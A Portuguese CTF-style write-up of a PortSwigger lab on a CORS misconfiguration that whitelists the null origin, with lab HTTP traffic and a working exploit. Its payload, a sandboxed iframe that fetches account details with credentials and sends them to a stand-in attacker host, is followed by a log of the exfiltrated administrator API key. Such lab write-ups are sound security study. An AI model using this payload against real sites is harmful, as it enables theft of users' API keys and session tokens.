---
title: "CORS Series: Part 2"
categories:
  - writeups
  - web hacking
  - owasp
tags:
  - writeups
  - ctf
  - owasp
  - cors
---
## Sumário
<!--toc:start-->
- [CORS Series: Origem desconhecida? Liberado](#cors-series-origem-desconhecida-liberado)
  - [CORS: Achando ele](#cors-achando-ele)
  - [CORS: E o que tem de perigoso em tudo isso?](#cors-e-o-que-tem-de-perigoso-em-tudo-isso)
- [No fim](#no-fim)
<!--toc:end-->

## CORS Series: Origem desconhecida? Liberado

Desta vez o caso é um pouco diferente e curioso. Origens explicitas
não são permitidas, porém origens nulas, desconhecidas são válidas.
Que curioso, vamos explorar um pouco mais este cenário!

Aqui está o [link](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
do lab caso queira acompanhar.

### CORS: Achando ele

Desta vez o caso é interessante, seguindo o mesmo processo
do caso anterior para descobrir o CORS, vemos algo diferente:

A request:

```plaietxt
GET /accountDetails HTTP/2
Host: 0a410063030d458b809b49e100a900e8.web-security-academy.net
Cookie: session=nRgeyaA6iUImkqTOT69aj22BcMSr9e4H
Sec-Ch-Ua-Platform: "Linux"
Origin: http://algumsite.com
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a410063030d458b809b49e100a900e8.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

```

A resposta:

```plaintext
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 189

{
  "username": "wiener",
  "email": "",
  "apikey": "OMXhMqjwTNvlolXpJCq38yqFl3FUqrle",
  "sessions": [
    "nRgeyaA6iUImkqTOT69aj22BcMSr9e4H",
    "GBtu6wHjSAoHCaG82LSufNHT8lKA7qfS"
  ]
}
```

Diferentemente do cenário anterior, não vemos reflexão do domínio.
Se você já deu uma pesquisada sobre **CORS Misconfiguration** , talvez
já tenha se deparado com cenário chamado **Null trusted origin**.

Nestes casos, inserir a palavra `null` ali no lugar de **<http://algumsite.com>** deve refletir o `null` na resposta da request.

Veja como seria:

A request:

```plaintext
GET /accountDetails HTTP/2
Host: 0a410063030d458b809b49e100a900e8.web-security-academy.net
Cookie: session=nRgeyaA6iUImkqTOT69aj22BcMSr9e4H
Sec-Ch-Ua-Platform: "Linux"
Origin: null
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a410063030d458b809b49e100a900e8.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

```

A resposta:

```plaintext
HTTP/2 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 189

{
  "username": "wiener",
  "email": "",
  "apikey": "OMXhMqjwTNvlolXpJCq38yqFl3FUqrle",
  "sessions": [
    "nRgeyaA6iUImkqTOT69aj22BcMSr9e4H",
    "GBtu6wHjSAoHCaG82LSufNHT8lKA7qfS"
  ]
}
```

Curioso, não acha? Para você entender, é como se no servidor, estivesse
assim:

```js
app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (origin === 'null') {
    res.setHeader('Access-Control-Allow-Origin', 'null');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

  next();
});

```

Mas é claro, não sabemos se realmente é assim, trata-se apenas de um exemplo.

Talvez você possa estar se questionando: em que momento, em qual cenário
seria gerado um `Origin: null`? Vou te ajudar!

Simples! `iframes`! Certamente, a essa altura do campeonato você já conheça
sobre eles.

Um código assim:

```HTML
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://algumsite.com/dados')
</script>
"></iframe>
```

Ou mesmo do tipo:

```plaintext
file:///home/user/exploit.html
```

Dentre alguns outros.

Talvez nem mesmo o programador espera um cenário como esses, ou mesmo
até espera, mas não consegue visualizar algo como vamos abordar agora.

### CORS: E o que tem de perigoso em tudo isso?

Agora chegou a hora de te mostrar como isso seria perigoso. Vamos organizar
as ideias que temos aqui.

O nosso cenário trata-se, basicamente, do mesmo que o anterior: uma
aplicação bem simples, porém com feature de autenticação,
autorização e gerenciamento de sessão. No momento do login,
o usuário recebe um **session cookie** e sua **API Key**.

O objetivo aqui vai ser nos aproveitarmos dessa falha de CORS
para conseguir a API Key de outro usuário alvo. **É sempre importante definir objetivos,
isso irá te guiar em todo seu ataque, sempre ataque se orientando a objetivos.**

**Mas, raciocine: aonde mora o perigo disso tudo?**

Se você leu o "episódio" anterior, você já deve ter sacado aonde
está o perigo: **A  confiança na origem errada.** Diferentemente
do anterior que confiava em **qualquer origem** este aqui confia apenas em uma
a: **null**, é somo se os dados só fossem liberados se vierem de `null`,
que poderia ser umm `<iframe>`, um `file:///algum/dado`, e por aí vai.
Talvez, quem projetou essa aplicação queria restringir
alguma coisa, alguma comunição entre domínios distintos,
não sabemos, (claro, aqui se trata de um ambiente simulado).
Isso é bem ruim pois conseguimos manipular
o payload de tal forma que ele gere uma origem nula,
como já citei exemplos. Mas o que potencializa tudo
isso é a presença do header `Access-Control-Allow-Credentials`,
que está liberando o acesso a dados para requisições vindas de origens nulas
bastando que elas tenham **alguma forma de identificação**,
como um **session cookie** armazeno em seu browser, por exemplo.  

Agora consegue visualizar o real problema?

Espero que sim! Bem, partindo para o cenário prático aqui,
veja como seria o payload para exploração desta falha:

```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
fetch('https://site-vitima.com/accountDetails', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.text())
.then(data => {
    location = 'https://atacante.com/log?key=' + encodeURIComponent(data);
});
</script>"></iframe>
```

Esse payload seria executado no contexto da vítima, podendo ser através
de algum XSS presente na aplicação vulnerável, ou talvez um CSRF.

No caso da **PortSwigger**, o *exploit server*  fará o papel
do site do atacante, além de simular a execução do payload
no contexto da vítima.

Eu não sei ao certo o porquê, mas parece que para esse lab só funciona o payload
fornecido por eles na resolução. A teoria é a mesma, mudou apenas
o payload. E usando o payload deles, veja que realmente conseguimos:

```plaintext
10.0.3.141      2026-03-20 20:04:13 +0000 "GET /exploit/exploit-0a07002903778d2383010ad8015f0026.exploit-server.net/log?key=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22mpvu2KYJSx3RWihGRxfepEsgi1oyEKQO%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%221oYUIIu8DasATe6IZT0lvqJkhSgg1xtv%22%0A%20%20%5D%0A%7D HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

Excelente!

## No fim

Veja que este cenário não foi tão diferente assim do anterior, não acha?
Esse vale a pena ter em mente ao se deparar com cenários de CORS. Não
foi tão complexo assim, mas em contrapartida o estrago poderia
ter sido grande, pensando em um cenário real, claro.

O próximo "episódio" será o fim desta série, com um cenário bem interessante!
Espero que esse conteúdo sirva de base para seus estudos. Mais uma vez,
meu objetivo aqui não é te ensinar a resolver o lab, mas sim te ajudar
a entender exploração de CORS de forma mais prática.

Muito obrigado!
Espero ter te ajudado em algo!
Até breve!

---
Para saber mais sobre
[CORS](https://portswigger.net/web-security/cors).
